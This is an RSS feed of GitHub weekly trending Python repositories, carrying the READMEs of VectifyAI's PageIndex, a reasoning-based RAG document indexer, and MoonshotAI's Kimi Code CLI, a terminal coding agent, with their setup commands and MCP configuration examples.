<rss version="2.0">
  <channel>
    <title>GitHub Python Weekly Trending</title>
    <description>Weekly Trending of Python in GitHub</description>
    <pubDate>Thu, 05 Feb 2026 01:57:56 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>VectifyAI/PageIndex</title>
      <link>https://github.com/VectifyAI/PageIndex</link>
      <description>&lt;p&gt;üìë PageIndex: Document Index for Vectorless, Reasoning-based RAG&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;a href="https://vectify.ai/pageindex" target="_blank"&gt; &lt;img src="https://github.com/user-attachments/assets/46201e72-675b-43bc-bfbd-081cc6b65a1d" alt="PageIndex Banner" /&gt; &lt;/a&gt; 
 &lt;br /&gt; 
 &lt;br /&gt; 
 &lt;p align="center"&gt; &lt;a href="https://trendshift.io/repositories/14736" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/14736" alt="VectifyAI%2FPageIndex | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt; &lt;/p&gt; 
 &lt;h1&gt;PageIndex: Vectorless, Reasoning-based RAG&lt;/h1&gt; 
 &lt;p align="center"&gt;&lt;b&gt;Reasoning-based RAG&amp;nbsp; ‚ó¶ &amp;nbsp;No Vector DB&amp;nbsp; ‚ó¶ &amp;nbsp;No Chunking&amp;nbsp; ‚ó¶ &amp;nbsp;Human-like Retrieval&lt;/b&gt;&lt;/p&gt; 
 &lt;h4 align="center"&gt; &lt;a href="https://vectify.ai"&gt;üè† Homepage&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://chat.pageindex.ai"&gt;üñ•Ô∏è Chat Platform&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://pageindex.ai/mcp"&gt;üîå MCP&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://docs.pageindex.ai"&gt;üìö Docs&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://discord.com/invite/VuXuf29EUj"&gt;üí¨ Discord&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://ii2abc2jejf.typeform.com/to/tK3AXl8T"&gt;‚úâÔ∏è Contact&lt;/a&gt;&amp;nbsp; &lt;/h4&gt; 
&lt;/div&gt; 
&lt;details open&gt; 
 &lt;summary&gt;&lt;h3&gt;üì¢ Latest Updates&lt;/h3&gt;&lt;/summary&gt; 
 &lt;p&gt;&lt;strong&gt;üî• Releases:&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://chat.pageindex.ai"&gt;&lt;strong&gt;PageIndex Chat&lt;/strong&gt;&lt;/a&gt;: The first human-like document-analysis agent &lt;a href="https://chat.pageindex.ai"&gt;platform&lt;/a&gt; built for professional long documents. Can also be integrated via &lt;a href="https://pageindex.ai/mcp"&gt;MCP&lt;/a&gt; or &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt; (beta).&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;!-- - [**PageIndex Chat API**](https://docs.pageindex.ai/quickstart): An API that brings PageIndex's advanced long-document intelligence directly into your applications and workflows. --&gt; 
 &lt;!-- - [PageIndex MCP](https://pageindex.ai/mcp): Bring PageIndex into Claude, Cursor, or any MCP-enabled agent. Chat with long PDFs in a reasoning-based, human-like way. --&gt; 
 &lt;p&gt;&lt;strong&gt;üìù Articles:&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://pageindex.ai/blog/pageindex-intro"&gt;&lt;strong&gt;PageIndex Framework&lt;/strong&gt;&lt;/a&gt;: Introduces the PageIndex framework ‚Äî an &lt;em&gt;agentic, in-context&lt;/em&gt; &lt;em&gt;tree index&lt;/em&gt; that enables LLMs to perform &lt;em&gt;reasoning-based&lt;/em&gt;, &lt;em&gt;human-like retrieval&lt;/em&gt; over long documents, without vector DB or chunking.&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;!-- - [Do We Still Need OCR?](https://pageindex.ai/blog/do-we-need-ocr): Explores how vision-based, reasoning-native RAG challenges the traditional OCR pipeline, and why the future of document AI might be *vectorless* and *vision-based*. --&gt; 
 &lt;p&gt;&lt;strong&gt;üß™ Cookbooks:&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://docs.pageindex.ai/cookbook/vectorless-rag-pageindex"&gt;Vectorless RAG&lt;/a&gt;: A minimal, hands-on example of reasoning-based RAG using PageIndex. No vectors, no chunking, and human-like retrieval.&lt;/li&gt; 
  &lt;li&gt;&lt;a href="https://docs.pageindex.ai/cookbook/vision-rag-pageindex"&gt;Vision-based Vectorless RAG&lt;/a&gt;: OCR-free, vision-only RAG with PageIndex's reasoning-native retrieval workflow that works directly over PDF page images.&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üìë Introduction to PageIndex&lt;/h1&gt; 
&lt;p&gt;Are you frustrated with vector database retrieval accuracy for long professional documents? Traditional vector-based RAG relies on semantic &lt;em&gt;similarity&lt;/em&gt; rather than true &lt;em&gt;relevance&lt;/em&gt;. But &lt;strong&gt;similarity ‚â† relevance&lt;/strong&gt; ‚Äî what we truly need in retrieval is &lt;strong&gt;relevance&lt;/strong&gt;, and that requires &lt;strong&gt;reasoning&lt;/strong&gt;. When working with professional documents that demand domain expertise and multi-step reasoning, similarity search often falls short.&lt;/p&gt; 
&lt;p&gt;Inspired by AlphaGo, we propose &lt;strong&gt;&lt;a href="https://vectify.ai/pageindex"&gt;PageIndex&lt;/a&gt;&lt;/strong&gt; ‚Äî a &lt;strong&gt;vectorless&lt;/strong&gt;, &lt;strong&gt;reasoning-based RAG&lt;/strong&gt; system that builds a &lt;strong&gt;hierarchical tree index&lt;/strong&gt; from long documents and uses LLMs to &lt;strong&gt;reason&lt;/strong&gt; &lt;em&gt;over that index&lt;/em&gt; for &lt;strong&gt;agentic, context-aware retrieval&lt;/strong&gt;. It simulates how &lt;em&gt;human experts&lt;/em&gt; navigate and extract knowledge from complex documents through &lt;em&gt;tree search&lt;/em&gt;, enabling LLMs to &lt;em&gt;think&lt;/em&gt; and &lt;em&gt;reason&lt;/em&gt; their way to the most relevant document sections. PageIndex performs retrieval in two steps:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Generate a ‚ÄúTable-of-Contents‚Äù &lt;strong&gt;tree structure index&lt;/strong&gt; of documents&lt;/li&gt; 
 &lt;li&gt;Perform reasoning-based retrieval through &lt;strong&gt;tree search&lt;/strong&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://pageindex.ai/blog/pageindex-intro" target="_blank" title="The PageIndex Framework"&gt; &lt;img src="https://docs.pageindex.ai/images/cookbook/vectorless-rag.png" width="70%" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;h3&gt;üéØ Core Features&lt;/h3&gt; 
&lt;p&gt;Compared to traditional vector-based RAG, &lt;strong&gt;PageIndex&lt;/strong&gt; features:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;No Vector DB&lt;/strong&gt;: Uses document structure and LLM reasoning for retrieval, instead of vector similarity search.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;No Chunking&lt;/strong&gt;: Documents are organized into natural sections, not artificial chunks.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Human-like Retrieval&lt;/strong&gt;: Simulates how human experts navigate and extract knowledge from complex documents.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Better Explainability and Traceability&lt;/strong&gt;: Retrieval is based on reasoning ‚Äî traceable and interpretable, with page and section references. No more opaque, approximate vector search (‚Äúvibe retrieval‚Äù).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;PageIndex powers a reasoning-based RAG system that achieved &lt;strong&gt;state-of-the-art&lt;/strong&gt; &lt;a href="https://github.com/VectifyAI/Mafin2.5-FinanceBench"&gt;98.7% accuracy&lt;/a&gt; on FinanceBench, demonstrating superior performance over vector-based RAG solutions in professional document analysis (see our &lt;a href="https://vectify.ai/blog/Mafin2.5"&gt;blog post&lt;/a&gt; for details).&lt;/p&gt; 
&lt;h3&gt;üìç Explore PageIndex&lt;/h3&gt; 
&lt;p&gt;To learn more, please see a detailed introduction of the &lt;a href="https://pageindex.ai/blog/pageindex-intro"&gt;PageIndex framework&lt;/a&gt;. Check out this GitHub repo for open-source code, and the &lt;a href="https://docs.pageindex.ai/cookbook"&gt;cookbooks&lt;/a&gt;, &lt;a href="https://docs.pageindex.ai/tutorials"&gt;tutorials&lt;/a&gt;, and &lt;a href="https://pageindex.ai/blog"&gt;blog&lt;/a&gt; for additional usage guides and examples.&lt;/p&gt; 
&lt;p&gt;The PageIndex service is available as a ChatGPT-style &lt;a href="https://chat.pageindex.ai"&gt;chat platform&lt;/a&gt;, or can be integrated via &lt;a href="https://pageindex.ai/mcp"&gt;MCP&lt;/a&gt; or &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;üõ†Ô∏è Deployment Options&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Self-host ‚Äî run locally with this open-source repo.&lt;/li&gt; 
 &lt;li&gt;Cloud Service ‚Äî try instantly with our &lt;a href="https://chat.pageindex.ai/"&gt;Chat Platform&lt;/a&gt;, or integrate with &lt;a href="https://pageindex.ai/mcp"&gt;MCP&lt;/a&gt; or &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;em&gt;Enterprise&lt;/em&gt; ‚Äî private or on-prem deployment. &lt;a href="https://ii2abc2jejf.typeform.com/to/tK3AXl8T"&gt;Contact us&lt;/a&gt; or &lt;a href="https://calendly.com/pageindex/meet"&gt;book a demo&lt;/a&gt; for more details.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üß™ Quick Hands-on&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Try the &lt;a href="https://github.com/VectifyAI/PageIndex/raw/main/cookbook/pageindex_RAG_simple.ipynb"&gt;&lt;strong&gt;Vectorless RAG&lt;/strong&gt;&lt;/a&gt; notebook ‚Äî a &lt;em&gt;minimal&lt;/em&gt;, hands-on example of reasoning-based RAG using PageIndex.&lt;/li&gt; 
 &lt;li&gt;Experiment with &lt;a href="https://github.com/VectifyAI/PageIndex/raw/main/cookbook/vision_RAG_pageindex.ipynb"&gt;&lt;em&gt;Vision-based Vectorless RAG&lt;/em&gt;&lt;/a&gt; ‚Äî no OCR; a minimal, reasoning-native RAG pipeline that works directly over page images.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://colab.research.google.com/github/VectifyAI/PageIndex/blob/main/cookbook/pageindex_RAG_simple.ipynb" target="_blank" rel="noopener"&gt; &lt;img src="https://img.shields.io/badge/Open_In_Colab-Vectorless_RAG-orange?style=for-the-badge&amp;amp;logo=googlecolab" alt="Open in Colab: Vectorless RAG" /&gt; &lt;/a&gt; &amp;nbsp;&amp;nbsp; 
 &lt;a href="https://colab.research.google.com/github/VectifyAI/PageIndex/blob/main/cookbook/vision_RAG_pageindex.ipynb" target="_blank" rel="noopener"&gt; &lt;img src="https://img.shields.io/badge/Open_In_Colab-Vision_RAG-orange?style=for-the-badge&amp;amp;logo=googlecolab" alt="Open in Colab: Vision RAG" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üå≤ PageIndex Tree Structure&lt;/h1&gt; 
&lt;p&gt;PageIndex can transform lengthy PDF documents into a semantic &lt;strong&gt;tree structure&lt;/strong&gt;, similar to a &lt;em&gt;"table of contents"&lt;/em&gt; but optimized for use with Large Language Models (LLMs). It's ideal for: financial reports, regulatory filings, academic textbooks, legal or technical manuals, and any document that exceeds LLM context limits.&lt;/p&gt; 
&lt;p&gt;Below is an example PageIndex tree structure. Also see more example &lt;a href="https://github.com/VectifyAI/PageIndex/tree/main/tests/pdfs"&gt;documents&lt;/a&gt; and generated &lt;a href="https://github.com/VectifyAI/PageIndex/tree/main/tests/results"&gt;tree structures&lt;/a&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-jsonc"&gt;...
{
  "title": "Financial Stability",
  "node_id": "0006",
  "start_index": 21,
  "end_index": 22,
  "summary": "The Federal Reserve ...",
  "nodes": [
    {
      "title": "Monitoring Financial Vulnerabilities",
      "node_id": "0007",
      "start_index": 22,
      "end_index": 28,
      "summary": "The Federal Reserve's monitoring ..."
    },
    {
      "title": "Domestic and International Cooperation and Coordination",
      "node_id": "0008",
      "start_index": 28,
      "end_index": 31,
      "summary": "In 2023, the Federal Reserve collaborated ..."
    }
  ]
}
...
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can generate the PageIndex tree structure with this open-source repo, or use our &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h1&gt;‚öôÔ∏è Package Usage&lt;/h1&gt; 
&lt;p&gt;You can follow these steps to generate a PageIndex tree from a PDF document.&lt;/p&gt; 
&lt;h3&gt;1. Install dependencies&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip3 install --upgrade -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;2. Set your OpenAI API key&lt;/h3&gt; 
&lt;p&gt;Create a &lt;code&gt;.env&lt;/code&gt; file in the root directory and add your API key:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;CHATGPT_API_KEY=your_openai_key_here
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;3. Run PageIndex on your PDF&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python3 run_pageindex.py --pdf_path /path/to/your/document.pdf
&lt;/code&gt;&lt;/pre&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;Optional parameters&lt;/strong&gt;&lt;/summary&gt; 
 &lt;br /&gt; You can customize the processing with additional optional arguments: 
 &lt;pre&gt;&lt;code&gt;--model                 OpenAI model to use (default: gpt-4o-2024-11-20)
--toc-check-pages       Pages to check for table of contents (default: 20)
--max-pages-per-node    Max pages per node (default: 10)
--max-tokens-per-node   Max tokens per node (default: 20000)
--if-add-node-id        Add node ID (yes/no, default: yes)
--if-add-node-summary   Add node summary (yes/no, default: yes)
--if-add-doc-description Add doc description (yes/no, default: yes)
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;Markdown support&lt;/strong&gt;&lt;/summary&gt; 
 &lt;br /&gt; We also provide markdown support for PageIndex. You can use the `-md_path` flag to generate a tree structure for a markdown file. 
 &lt;pre&gt;&lt;code class="language-bash"&gt;python3 run_pageindex.py --md_path /path/to/your/document.md
&lt;/code&gt;&lt;/pre&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;Note: in this function, we use "#" to determine node heading and their levels. For example, "##" is level 2, "###" is level 3, etc. Make sure your markdown file is formatted correctly. If your Markdown file was converted from a PDF or HTML, we don't recommend using this function, since most existing conversion tools cannot preserve the original hierarchy. Instead, use our &lt;a href="https://pageindex.ai/blog/ocr"&gt;PageIndex OCR&lt;/a&gt;, which is designed to preserve the original hierarchy, to convert the PDF to a markdown file and then use this function.&lt;/p&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt; 
&lt;!-- 
# ‚òÅÔ∏è Improved Tree Generation with PageIndex OCR

This repo is designed for generating PageIndex tree structure for simple PDFs, but many real-world use cases involve complex PDFs that are hard to parse by classic Python tools. However, extracting high-quality text from PDF documents remains a non-trivial challenge. Most OCR tools only extract page-level content, losing the broader document context and hierarchy.

To address this, we introduced PageIndex OCR ‚Äî the first long-context OCR model designed to preserve the global structure of documents. PageIndex OCR significantly outperforms other leading OCR tools, such as those from Mistral and Contextual AI, in recognizing true hierarchy and semantic relationships across document pages.

- Experience next-level OCR quality with PageIndex OCR at our [Dashboard](https://dash.pageindex.ai/).
- Integrate PageIndex OCR seamlessly into your stack via our [API](https://docs.pageindex.ai/quickstart).

&lt;p align="center"&gt;
  &lt;img src="https://github.com/user-attachments/assets/eb35d8ae-865c-4e60-a33b-ebbd00c41732" width="80%"&gt;
&lt;/p&gt;
--&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üìà Case Study: PageIndex Leads Finance QA Benchmark&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://vectify.ai/mafin"&gt;Mafin 2.5&lt;/a&gt; is a reasoning-based RAG system for financial document analysis, powered by &lt;strong&gt;PageIndex&lt;/strong&gt;. It achieved a state-of-the-art &lt;a href="https://vectify.ai/blog/Mafin2.5"&gt;&lt;strong&gt;98.7% accuracy&lt;/strong&gt;&lt;/a&gt; on the &lt;a href="https://arxiv.org/abs/2311.11944"&gt;FinanceBench&lt;/a&gt; benchmark, significantly outperforming traditional vector-based RAG systems.&lt;/p&gt; 
&lt;p&gt;PageIndex's hierarchical indexing and reasoning-driven retrieval enable precise navigation and extraction of relevant context from complex financial reports, such as SEC filings and earnings disclosures.&lt;/p&gt; 
&lt;p&gt;Explore the full &lt;a href="https://github.com/VectifyAI/Mafin2.5-FinanceBench"&gt;benchmark results&lt;/a&gt; and our &lt;a href="https://vectify.ai/blog/Mafin2.5"&gt;blog post&lt;/a&gt; for detailed comparisons and performance metrics.&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://github.com/VectifyAI/Mafin2.5-FinanceBench"&gt; &lt;img src="https://github.com/user-attachments/assets/571aa074-d803-43c7-80c4-a04254b782a3" width="70%" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üß≠ Resources&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;üß™ &lt;a href="https://docs.pageindex.ai/cookbook/vectorless-rag-pageindex"&gt;Cookbooks&lt;/a&gt;: hands-on, runnable examples and advanced use cases.&lt;/li&gt; 
 &lt;li&gt;üìñ &lt;a href="https://docs.pageindex.ai/doc-search"&gt;Tutorials&lt;/a&gt;: practical guides and strategies, including &lt;em&gt;Document Search&lt;/em&gt; and &lt;em&gt;Tree Search&lt;/em&gt;.&lt;/li&gt; 
 &lt;li&gt;üìù &lt;a href="https://pageindex.ai/blog"&gt;Blog&lt;/a&gt;: technical articles, research insights, and product updates.&lt;/li&gt; 
 &lt;li&gt;üîå &lt;a href="https://pageindex.ai/mcp#quick-setup"&gt;MCP setup&lt;/a&gt; &amp;amp; &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API docs&lt;/a&gt;: integration details and configuration options.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h1&gt;‚≠ê Support Us&lt;/h1&gt; 
&lt;p&gt;Leave us a star üåü if you like our project. Thank you!&lt;/p&gt; 
&lt;p&gt; &lt;img src="https://github.com/user-attachments/assets/eae4ff38-48ae-4a7c-b19f-eab81201d794" width="80%" /&gt; &lt;/p&gt; 
&lt;h3&gt;Connect with Us&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://x.com/PageIndexAI"&gt;&lt;img src="https://img.shields.io/badge/Twitter-000000?style=for-the-badge&amp;amp;logo=x&amp;amp;logoColor=white" alt="Twitter" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://www.linkedin.com/company/vectify-ai/"&gt;&lt;img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&amp;amp;logo=linkedin&amp;amp;logoColor=white" alt="LinkedIn" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://discord.com/invite/VuXuf29EUj"&gt;&lt;img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&amp;amp;logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://ii2abc2jejf.typeform.com/to/tK3AXl8T"&gt;&lt;img src="https://img.shields.io/badge/Contact_Us-3B82F6?style=for-the-badge&amp;amp;logo=envelope&amp;amp;logoColor=white" alt="Contact Us" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;¬© 2025 &lt;a href="https://vectify.ai"&gt;Vectify AI&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>MoonshotAI/kimi-cli</title>
      <link>https://github.com/MoonshotAI/kimi-cli</link>
      <description>&lt;p&gt;Kimi Code CLI is your next CLI agent.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Kimi Code CLI&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/MoonshotAI/kimi-cli/graphs/commit-activity"&gt;&lt;img src="https://img.shields.io/github/commit-activity/w/MoonshotAI/kimi-cli" alt="Commit Activity" /&gt;&lt;/a&gt; &lt;a href="https://github.com/MoonshotAI/kimi-cli/actions"&gt;&lt;img src="https://img.shields.io/github/check-runs/MoonshotAI/kimi-cli/main" alt="Checks" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/kimi-cli/"&gt;&lt;img src="https://img.shields.io/pypi/v/kimi-cli" alt="Version" /&gt;&lt;/a&gt; &lt;a href="https://pypistats.org/packages/kimi-cli"&gt;&lt;img src="https://img.shields.io/pypi/dw/kimi-cli" alt="Downloads" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/MoonshotAI/kimi-cli"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://www.kimi.com/code/"&gt;Kimi Code&lt;/a&gt; | &lt;a href="https://moonshotai.github.io/kimi-cli/en/"&gt;Documentation&lt;/a&gt; | &lt;a href="https://moonshotai.github.io/kimi-cli/zh/"&gt;ÊñáÊ°£&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Kimi Code CLI is an AI agent that runs in the terminal, helping you complete software development tasks and terminal operations. It can read and edit code, execute shell commands, search and fetch web pages, and autonomously plan and adjust actions during execution.&lt;/p&gt; 
&lt;h2&gt;Getting Started&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://moonshotai.github.io/kimi-cli/en/guides/getting-started.html"&gt;Getting Started&lt;/a&gt; for how to install and start using Kimi Code CLI.&lt;/p&gt; 
&lt;h2&gt;Key Features&lt;/h2&gt; 
&lt;h3&gt;Shell command mode&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI is not only a coding agent, but also a shell. You can switch the shell command mode by pressing &lt;code&gt;Ctrl-X&lt;/code&gt;. In this mode, you can directly run shell commands without leaving Kimi Code CLI.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/MoonshotAI/kimi-cli/main/docs/media/shell-mode.gif" alt="" /&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] Built-in shell commands like &lt;code&gt;cd&lt;/code&gt; are not supported yet.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;VS Code extension&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI can be integrated with &lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt; via the &lt;a href="https://marketplace.visualstudio.com/items?itemName=moonshot-ai.kimi-code"&gt;Kimi Code VS Code Extension&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/MoonshotAI/kimi-cli/main/docs/media/vscode.png" alt="VS Code Extension" /&gt;&lt;/p&gt; 
&lt;h3&gt;IDE integration via ACP&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI supports &lt;a href="https://github.com/agentclientprotocol/agent-client-protocol"&gt;Agent Client Protocol&lt;/a&gt; out of the box. You can use it together with any ACP-compatible editor or IDE.&lt;/p&gt; 
&lt;p&gt;To use Kimi Code CLI with ACP clients, make sure to run Kimi Code CLI in the terminal and send &lt;code&gt;/login&lt;/code&gt; to complete the login first. Then, you can configure your ACP client to start Kimi Code CLI as an ACP agent server with command &lt;code&gt;kimi acp&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;For example, to use Kimi Code CLI with &lt;a href="https://zed.dev/"&gt;Zed&lt;/a&gt; or &lt;a href="https://blog.jetbrains.com/ai/2025/12/bring-your-own-ai-agent-to-jetbrains-ides/"&gt;JetBrains&lt;/a&gt;, add the following configuration to your &lt;code&gt;~/.config/zed/settings.json&lt;/code&gt; or &lt;code&gt;~/.jetbrains/acp.json&lt;/code&gt; file:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "agent_servers": {
    "Kimi Code CLI": {
      "command": "kimi",
      "args": ["acp"],
      "env": {}
    }
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Then you can create Kimi Code CLI threads in IDE's agent panel.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/MoonshotAI/kimi-cli/main/docs/media/acp-integration.gif" alt="" /&gt;&lt;/p&gt; 
&lt;h3&gt;Zsh integration&lt;/h3&gt; 
&lt;p&gt;You can use Kimi Code CLI together with Zsh, to empower your shell experience with AI agent capabilities.&lt;/p&gt; 
&lt;p&gt;Install the &lt;a href="https://github.com/MoonshotAI/zsh-kimi-cli"&gt;zsh-kimi-cli&lt;/a&gt; plugin via:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;git clone https://github.com/MoonshotAI/zsh-kimi-cli.git \
  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/kimi-cli
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] If you are using a plugin manager other than Oh My Zsh, you may need to refer to the plugin's README for installation instructions.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Then add &lt;code&gt;kimi-cli&lt;/code&gt; to your Zsh plugin list in &lt;code&gt;~/.zshrc&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;plugins=(... kimi-cli)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After restarting Zsh, you can switch to agent mode by pressing &lt;code&gt;Ctrl-X&lt;/code&gt;.&lt;/p&gt; 
&lt;h3&gt;MCP support&lt;/h3&gt; 
&lt;p&gt;Kimi Code CLI supports MCP (Model Context Protocol) tools.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;&lt;code&gt;kimi mcp&lt;/code&gt; sub-command group&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;You can manage MCP servers with &lt;code&gt;kimi mcp&lt;/code&gt; sub-command group. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;# Add streamable HTTP server:
kimi mcp add --transport http context7 https://mcp.context7.com/mcp --header "CONTEXT7_API_KEY: ctx7sk-your-key"

# Add streamable HTTP server with OAuth authorization:
kimi mcp add --transport http --auth oauth linear https://mcp.linear.app/mcp

# Add stdio server:
kimi mcp add --transport stdio chrome-devtools -- npx chrome-devtools-mcp@latest

# List added MCP servers:
kimi mcp list

# Remove an MCP server:
kimi mcp remove chrome-devtools

# Authorize an MCP server:
kimi mcp auth linear
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Ad-hoc MCP configuration&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Kimi Code CLI also supports ad-hoc MCP server configuration via CLI option.&lt;/p&gt; 
&lt;p&gt;Given an MCP config file in the well-known MCP config format like the following:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "mcpServers": {
    "context7": {
      "url": "https://mcp.context7.com/mcp",
      "headers": {
        "CONTEXT7_API_KEY": "YOUR_API_KEY"
      }
    },
    "chrome-devtools": {
      "command": "npx",
      "args": ["-y", "chrome-devtools-mcp@latest"]
    }
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Run &lt;code&gt;kimi&lt;/code&gt; with &lt;code&gt;--mcp-config-file&lt;/code&gt; option to connect to the specified MCP servers:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;kimi --mcp-config-file /path/to/mcp.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;More&lt;/h3&gt; 
&lt;p&gt;See more features in the &lt;a href="https://moonshotai.github.io/kimi-cli/en/"&gt;Documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;To develop Kimi Code CLI, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;git clone https://github.com/MoonshotAI/kimi-cli.git
cd kimi-cli

make prepare  # prepare the development environment
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Then you can start working on Kimi Code CLI.&lt;/p&gt; 
&lt;p&gt;Refer to the following commands after you make changes:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-sh"&gt;uv run kimi  # run Kimi Code CLI

make format  # format code
make check  # run linting and type checking
make test  # run tests
make test-kimi-cli  # run Kimi Code CLI tests only
make test-kosong  # run kosong tests only
make test-pykaos  # run pykaos tests only
make build-web  # build the web UI and sync it into the package (requires Node.js/npm)
make build  # build python packages
make build-bin  # build standalone binary
make help  # show all make targets
&lt;/code&gt;&lt;/pre&gt; 
